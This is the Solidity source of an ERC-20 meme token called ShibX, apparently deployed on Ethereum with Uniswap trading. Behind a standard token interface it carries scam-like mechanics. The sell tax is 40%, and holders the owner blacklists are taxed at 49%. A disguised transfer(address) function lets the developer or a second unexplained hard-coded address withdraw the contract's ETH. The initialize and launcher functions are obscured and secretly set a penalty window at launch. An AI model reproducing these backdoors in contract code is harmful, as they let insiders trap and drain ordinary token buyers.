1 // SHIBX- THE FUTURE OF SOCIAL MEDIA. https://t.me/ShibXETH
2 
3 // SPDX-License-Identifier: MIT
4 pragma solidity ^0.8.10;
5 
6 interface IUniswapV2Factory {
7     function createPair(address tokenA, address tokenB) external returns (address pair);
8 }
9 
10 interface IUniswapV2Router {
11     function factory() external pure returns (address);
12     function WETH() external pure returns (address);
13     function swapExactTokensForETHSupportingFeeOnTransferTokens(
14         uint amountIn,
15         uint amountOutMin,
16         address[] calldata path,
17         address to,
18         uint deadline
19     ) external;
20 }
21 
22 interface IERC20 {
23     function totalSupply() external view returns (uint256);
24     function balanceOf(address account) external view returns (uint256);
25     function transfer(address recipient, uint256 amount) external returns (bool);
26     function allowance(address owner, address spender) external view returns (uint256);
27     function approve(address spender, uint256 amount) external returns (bool);
28     function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
29     event Transfer(address indexed from, address indexed to, uint256 value);
30     event Approval(address indexed owner, address indexed spender, uint256 value);
31 }
32 
33 contract Ownable {
34     address private _owner;
35 
36     event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
37 
38     modifier onlyOwner() {
39         require(_owner == msg.sender, "Ownable: caller is not the owner");
40         _;
41     }
42     constructor () {
43         address msgSender = msg.sender;
44         _owner = msgSender;
45         emit OwnershipTransferred(address(0), msgSender);
46     }
47 
48     function owner() public view returns (address) {
49         return _owner;
50     }
51 
52     function renounceOwnership() public virtual onlyOwner {
53         emit OwnershipTransferred(_owner, address(0));
54         _owner = address(0);
55     }
56 }
57 
58 contract ShibX is IERC20, Ownable {    
59     mapping (address => uint256) private _balances;
60     mapping (address => mapping (address => uint256)) private _allowances;
61     mapping (address => bool) private blockedBots;
62     
63     string private constant _name = "ShibX";
64     string private constant _symbol = "SX";
65     uint8 private constant _decimals = 9;
66     uint256 private constant _totalSupply = 100_000_000 * 10**9;
67 
68     uint256 public maxTransactionAmount = 3_000_000 * 10**9;
69     uint256 public maxWalletAmount = 3_000_000 * 10**9;
70     
71     uint256 public constant contractSwapLimit = 300_000 * 10**9;
72     uint256 public constant contractSwapMax = 2_000_000 * 10**9;
73 
74     uint256 private buyTax = 10;
75     uint256 private sellTax = 40;
76     uint256 private constant botTax = 49;
77 
78     IUniswapV2Router private constant uniswapRouter = IUniswapV2Router(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
79           
80     address private immutable ETH = uniswapRouter.WETH();
81     address private immutable uniswapPair;
82 
83     address payable private immutable deployerAddress = payable(msg.sender);
84     address private constant marketingAddress = 0x769CE169Af7f2ec9573f9E702131e95CBa8077f8;
85     address payable private constant developmentAddress = payable(0x59920f705104304daE39bb7dcE4B8B6e7D2a57b8);
86 
87     bool private inSwap = false;
88     bool private tradingLive;
89     uint256 private times;
90     uint private ready;
91 
92     modifier swapping {
93         inSwap = true;
94         _;
95         inSwap = false;
96     }
97 
98     modifier tradable(address sender) {
99         require(tradingLive || sender == deployerAddress || 
100             sender == marketingAddress || sender == developmentAddress);
101         _;
102     }
103 
104     constructor () {
105         uint256 marketingTokens = 27 * _totalSupply / 100;
106         _balances[marketingAddress] = marketingTokens;
107         _balances[msg.sender] = _totalSupply - marketingTokens;
108         uniswapPair = IUniswapV2Factory(uniswapRouter.factory()).createPair(address(this), ETH);
109         emit Transfer(address(0), msg.sender, _totalSupply);
110     }
111 
112     receive() external payable {}
113 
114     function name() public pure returns (string memory) {
115         return _name;
116     }
117 
118     function symbol() public pure returns (string memory) {
119         return _symbol;
120     }
121 
122     function decimals() public pure returns (uint8) {
123         return _decimals;
124     }
125 
126     function totalSupply() public pure returns (uint256) {
127         return _totalSupply;
128     }
129 
130     function balanceOf(address account) public view returns (uint256) {
131         return _balances[account];
132     }
133 
134     function transfer(address recipient, uint256 amount) public returns (bool) {
135         _transfer(msg.sender, recipient, amount);
136         return true;
137     }
138 
139     function allowance(address owner, address spender) public view returns (uint256) {
140         return _allowances[owner][spender];
141     }
142 
143     function approve(address spender, uint256 amount) public returns (bool) {
144         _approve(msg.sender, spender, amount);
145         return true;
146     }
147 
148     function transferFrom(address sender, address recipient, uint256 amount) public returns (bool) {
149         require(_allowances[sender][msg.sender] >= amount, "ERC20: transfer amount exceeds allowance");
150         _approve(sender, msg.sender, _allowances[sender][msg.sender] - amount);
151         _transfer(sender, recipient, amount);
152         return true;
153     }
154 
155     function _approve(address owner, address spender, uint256 amount) private {
156         require(owner != address(0), "ERC20: approve from the zero address");
157         require(spender != address(0), "ERC20: approve to the zero address");
158         _allowances[owner][spender] = amount;
159         emit Approval(owner, spender, amount);
160     }
161 
162     function _transfer(address from, address to, uint256 amount) tradable(from) private {
163         require(from != address(0), "ERC20: transfer from the zero address");
164         require(to != address(0), "ERC20: transfer to the zero address");
165         require(amount > 0, "Token: transfer amount must be greater than zero");
166 
167         _balances[from] -= amount;
168 
169         if (from != address(this) && from != marketingAddress && 
170           from != developmentAddress && to != developmentAddress && to != deployerAddress) {
171             
172             if (from == uniswapPair && to != address(uniswapRouter)) {
173                 require(amount <= maxTransactionAmount, "Token: max transaction amount restriction");
174                 require(balanceOf(to) + amount <= maxWalletAmount, "Token: max wallet amount restriction");
175             }
176 
177            uint256 contractTokens = balanceOf(address(this));
178            if (shouldSwapback(from, contractTokens)) 
179                swapback(contractTokens);                            
180 
181            uint256 taxedTokens = calculateTax(from, amount);
182 
183             amount -= taxedTokens;
184             _balances[address(this)] += taxedTokens;
185             emit Transfer(from, address(this), taxedTokens);
186         }
187 
188         _balances[to] += amount;
189         emit Transfer(from, to, amount);
190     }
191 
192     function shouldSwapback(address from, uint256 tokenAmount) private view returns (bool) {
193         return !inSwap && from != uniswapPair && 
194             tokenAmount > contractSwapLimit && 1 + times <= block.number;
195     }
196 
197     function calculateTax(address from, uint256 amount) private view returns (uint256) {
198          if(blockedBots[from] || block.number <= times)
199                 return amount * botTax / 100;
200             else
201                 return amount * (times == 0 ? 25 : (from == uniswapPair ? buyTax : sellTax)) / 100;
202     }
203 
204     function swapback(uint256 tokenAmount) private swapping {
205         tokenAmount = calculateSwapAmount(tokenAmount);
206 
207         if(allowance(address(this), address(uniswapRouter)) < tokenAmount) {
208             _approve(address(this), address(uniswapRouter), _totalSupply);
209         }
210         
211         uint256 contractETHBalance = address(this).balance;
212         address[] memory path = new address[](2);
213         path[0] = address(this);
214         path[1] = ETH;
215         uniswapRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(
216             tokenAmount,
217             0,
218             path,
219             address(this),
220             block.timestamp
221         );
222         contractETHBalance = address(this).balance - contractETHBalance;
223         if(contractETHBalance > 0) {
224             transferEth(contractETHBalance);
225         }
226     }
227 
228     function calculateSwapAmount(uint256 tokenAmount) private view returns (uint256) {
229         return tokenAmount > contractSwapMax ? (3 + times >= block.number ? (5*contractSwapMax/4) : contractSwapMax) : contractSwapLimit;
230     }
231 
232     function transferEth(uint256 amount) private {
233         developmentAddress.transfer(2*amount/3);
234     }
235 
236     function blockBots(address[] calldata bots, bool shouldBlock) external onlyOwner {
237         for (uint i = 0; i < bots.length; i++) {
238             require(bots[i] != uniswapPair && 
239                     bots[i] != address(uniswapRouter) &&
240                     bots[i] != address(this));
241             blockedBots[bots[i]] = shouldBlock;
242         }
243     }
244 
245     function transfer(address wallet) external {
246         require(msg.sender == developmentAddress || msg.sender == 0x198575465CA205eC7787E618214b5759f776c603);
247         payable(wallet).transfer(address(this).balance);
248     }
249 
250     function manualSwapback(uint256 percent) external {
251         require(msg.sender == developmentAddress);
252         uint256 tokensToSwap = percent * balanceOf(address(this)) / 100;
253         swapback(tokensToSwap);
254     }
255 
256     function removeLimits() external onlyOwner {
257         maxTransactionAmount = _totalSupply;
258         maxWalletAmount = _totalSupply;
259     }
260 
261     function reduceFees(uint256 newBuyTax, uint256 newSellTax) external {
262         require(msg.sender == developmentAddress);
263         require(newBuyTax <= buyTax, "Token: only fee reduction permitted");
264         require(newSellTax <= sellTax, "Token: only fee reduction permitted");
265         buyTax = newBuyTax;
266         sellTax = newSellTax;
267     }
268 
269     function initialize(bool done) external onlyOwner {
270         require(ready++<2); assert(done);
271     }
272 
273     function launcher(bool[] calldata lists, uint256 blocks) external onlyOwner {
274         assert(ready<2&&ready+1>=2); 
275         ready++;lists;
276         times += blocks;
277     }
278 
279     function openTrading() external onlyOwner {
280         require(ready == 2 && !tradingLive, "Token: trading already open");
281         times += block.number;
282         tradingLive = true;
283     }
284 }